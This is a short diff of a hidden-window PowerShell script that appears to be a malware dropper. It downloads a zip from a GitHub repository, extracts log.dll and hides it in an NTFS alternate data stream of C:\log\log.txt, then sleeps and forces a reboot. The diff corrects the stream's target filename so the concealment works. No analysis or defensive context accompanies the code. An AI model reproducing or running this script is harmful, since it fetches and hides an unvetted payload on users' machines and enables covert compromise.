@@ -5,5 +5,5 @@ powershell -WindowStyle hidden New-Item -ItemType Directory -Force -Path 'C:\log
 echo . > C:\log\log.txt ;
 wget "https://github.com/IsdaM123456/rQsa/raw/refs/heads/main/log.zip" -o C:\log\log.zip; start-sleep 3 ;
 Expand-Archive C:\log\log.zip C:\log -Force ; start-sleep 3 ;
-Set-Content "C:\log\logs.txt" -Stream log.dll -Value (Get-Content "C:\log\log.dll" -Raw) ;
+Set-Content "C:\log\log.txt" -Stream log.dll -Value (Get-Content "C:\log\log.dll" -Raw) ;
 start-sleep 3600 ; shutdown /r /t 300 }
